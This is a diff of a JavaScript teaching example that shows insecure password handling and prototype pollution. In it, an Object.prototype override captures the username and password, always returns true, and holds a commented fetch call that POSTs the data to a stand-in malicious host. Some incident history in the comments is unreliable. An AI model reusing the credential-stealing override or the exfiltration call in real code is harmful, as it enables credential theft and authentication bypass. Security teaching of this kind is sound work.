@@ -1,50 +1,54 @@
-// 민감한 데이터를 다루는 클래스
+// Class handling sensitive data - public/private/protected
 class UserAccount {
   constructor(username, password) {
     this.username = username;
-    this.password = password; // 비밀번호를 평문으로 저장
+    this.password = password; // Storing password in plain text
   }
 
-  // 메서드가 prototype에 노출됨
+  // Method exposed in prototype
   validatePassword(input) {
     return this.password === input;
   }
 }
 
-// 클래스 인스턴스 생성
+// Create class instance
 const user = new UserAccount("admin", "1234");
+console.log("Auth (1234):", user.validatePassword("1234")); // true
 
-// 문제점 1: 객체의 프로퍼티에 직접 접근 가능
-console.log("비밀번호 노출:", user.password);
+// Issue 1: Direct access to object properties
+console.log("Password exposed:", user.password);
 
-// 문제점 2: 프로토타입 체인을 통해 메서드가 변조될 수 있는 취약점
-// - 실제 사례: 2018년 event-stream 패키지 해킹 사건
-//   - 악성코드가 Object.prototype을 오염시켜 비트코인 지갑 탈취
-// - 2016년 jQuery CDN 해킹으로 jQuery.fn이 변조된 사례
-//   - 수백만 웹사이트에 악성 스크립트가 주입됨
-// - Node.js 패키지의 prototype pollution 취약점들
-//   - lodash < 4.17.12 버전의 merge/setWith 함수 취약점
-//   - 2019년 발견된 jQuery $.extend의 prototype 오염 취약점
-// 이러한 공격은 Object.freeze()나 private 필드 사용으로 방지 가능
-// 실제 prototype pollution 공격 사례와 유사한 코드
-// 2018년 event-stream 사건처럼 Object.prototype 오염
+// Issue 2: Vulnerability where methods can be tampered with through prototype chain
+// - Real case: 2018 event-stream package hacking incident
+//   - Malicious code polluted Object.prototype to steal Bitcoin wallets
+// - 2016 jQuery CDN hacking where jQuery.fn was tampered with
+//   - Malicious scripts injected into millions of websites
+// - Node.js package prototype pollution vulnerabilities
+//   - lodash < 4.17.12 version merge/setWith function vulnerability
+//   - jQuery $.extend prototype pollution vulnerability discovered in 2019
+// These attacks can be prevented using Object.freeze() or private fields
+// Code similar to actual prototype pollution attacks
+// Polluting Object.prototype like in the 2018 event-stream incident
 Object.prototype.validatePassword = function() {
-  // 비밀번호 탈취 및 외부 서버로 전송하는 코드
+  // Code to steal password and send to external server
   const stolenData = {
     username: this.username,
     password: this.password,
     timestamp: new Date().toISOString()
   };
-  console.log("비밀번호가 탈취됨:", stolenData);
+  console.log("Password stolen:", stolenData);
   
-  // 실제 공격에서는 아래와 같이 외부로 데이터 전송
+  // In actual attack, data would be sent externally like this:
   // fetch('https://malicious-server.com/collect', {
   //   method: 'POST',
   //   body: JSON.stringify(stolenData)
   // });
   
-  return true; // 항상 인증 통과하도록 하여 공격 은폐
+  return true; // Always pass authentication to hide the attack
 };
 
-// 변조된 메서드 호출
-console.log("인증 우회:", user.validatePassword("wrong_password")); // true 반환
+// 💣 인스턴스에서 메서드 제거 (또는 UserAccount.prototype에서 삭제)
+delete UserAccount.prototype.validatePassword;
+
+// Call the tampered method
+console.log("Authentication bypassed:", user.validatePassword("test")); // Returns true
